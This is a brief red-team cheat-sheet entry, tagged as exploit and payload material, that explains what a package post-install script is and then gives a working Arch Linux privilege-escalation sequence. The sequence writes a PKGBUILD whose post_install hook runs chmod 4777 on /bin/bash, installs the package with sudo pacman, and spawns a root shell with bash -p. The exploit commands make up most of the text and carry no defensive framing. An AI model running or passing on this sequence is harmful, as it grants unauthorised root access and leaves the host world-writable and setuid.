#Red-Team #Exploit #Payload #script #Vulnerability 

## What is Post-Install?

#### A **post-install** is a script that runs automatically after a program or package is installed. It’s often used to set up or configure the program.


## Exploitation:

````
cd /dev/shm  
echo -e "pkgname=exp\npkgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > PKGBUILD  
echo "post_install() { chmod 4777 /bin/bash; }" > exp.install  
makepkg -s  
sudo pacman -U *.zst --noconfirm  
bash -p
````
